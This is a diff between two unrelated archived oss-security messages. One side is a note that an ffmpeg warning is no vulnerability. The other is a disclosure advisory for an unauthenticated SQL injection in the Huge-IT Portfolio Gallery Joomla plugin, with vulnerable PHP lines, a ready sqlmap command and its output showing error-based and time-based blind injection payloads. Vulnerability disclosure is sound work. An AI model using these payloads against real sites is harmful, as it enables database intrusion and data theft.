@@ -1,38 +1,51 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/26/7
-Message-ID: <20160926113405.6454bfa6@hboeck.de>
-Date: Mon, 26 Sep 2016 11:34:05 +0200
-From: Hanno Böck <hanno@...eck.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/23/2
+Message-id: <02DB2C41-3186-45AD-9FC9-639FE9B256C0@me.com>
+Date: Fri, 23 Sep 2016 03:50:33 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Re: ffmpeg afl bugs
+Subject: Unauthenticated SQL Injection in Huge-IT Portfolio Gallery
 Content-Type: text/plain; charset=utf-8
 
-Hello,
 
-On Mon, 26 Sep 2016 01:45:40 -0400 (EDT)
-cve-assign@...re.org wrote:
+Title: Unauthenticated SQL Injection in Huge-IT Portfolio Gallery Plugin v1.0.6
+Author: Larry W. Cashdollar, @_larry0
+Date: 2016-09-16
+Download Site: http://huge-it.com/joomla-portfolio-gallery/
+Vendor: huge-it.com, fixed v1.0.7
+Vendor Notified: 2016-09-17
+Vendor Contact: info@...e-it.com
+Description: Huge-IT Portfolio Gallery extension can do wonders with your website. If you wish to show your photos, videos, enclosing the additional images and videos, then this Portfolio Gallery extension is what you need.
+Vulnerability:
+The following lines allow unauthenticated users to perform SQL injection against the functions in ajax_url.php: In file ajax_url.php: 11 define('_JEXEC',1); 12 defined('_JEXEC') or die('Restircted access'); . . . 49 $page = $_POST["page"]; 50 $num=$_POST['perpage']; 51 $start = $page * $num - $num; 52 $idofgallery=$_POST['galleryid']; 53 $level = $_POST['level']; 54 $query = $db->getQuery(true); 55 $query->select('*'); 56 $query->from('#__huge_itportfolio_images'); 57 $query->where('portfolio_id ='.$idofgallery); 58 $query ->order('#__huge_itportfolio_images.ordering asc'); 59 $db->setQuery($query,$start,$num);
+CVE-2016-1000124
 
-> > overread end of atom 'stsd' by 4294967134 bytes  
-> 
-> Use CVE-2016-7554.
+Exploit Code:
+$ sqlmap -u 'http://example.com/components/com_portfoliogallery/ajax_url.php' --data="page=1&galleryid=*&post=huge_it_portfolio_gallery_ajax&perpage=20&linkbutton=2" --level=5 --risk=3
+ 
+ 
+(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+sqlmap identified the following injection point(s) with a total of 2870 HTTP(s) requests:
+---
+Parameter: #1* ((custom) POST)
+ Type: error-based
+ Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
+ Payload: page=1&galleryid=-2264 OR 1 GROUP BY CONCAT(0x71716a7a71,(SELECT (CASE WHEN (3883=3883) THEN 1 ELSE 0 END)),0x7178627071,FLOOR(RAND(0)*2)) HAVING MIN(0)#&post=huge_it_portfolio_gallery_ajax&perpage=20&linkbutton=2
+ 
+ Type: AND/OR time-based blind
+ Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+ Payload: page=1&galleryid=(CASE WHEN (9445=9445) THEN SLEEP(5) ELSE 9445 END)&post=huge_it_portfolio_gallery_ajax&perpage=20&linkbutton=2
+---
+[13:30:39] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 8.0 (jessie)
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL >= 5.0.12
+[13:30:39] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 2715 times
+[13:30:39] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/192.168.0.4'
+ 
+[*] shutting down at 13:30:39
 
-I don't think this is any vuln.
-
-This is a warning message from ffmpeg itself, not from any memory
-safety tool. Thus I interpret this as "this file is garbled and would
-overread if we'd do what the file offsets indicate".
-
-It probably indicated a bug that Michal originally found with this
-file, but that happened long ago. The file is from Dec 2014 (looks like
-this [1]).
+Advisory: http://www.vapidlabs.com/advisory.php?v=170
 
 
-[1] https://ffmpeg.org/pipermail/ffmpeg-cvslog/2014-December/084342.html
--- 
-Hanno Böck
-https://hboeck.de/
-
-mail/jabber: hanno@...eck.de
-GPG: FE73757FA60E4E21B937579FA5880072BBB51E42
-
-Content of type "application/pgp-signature" skipped
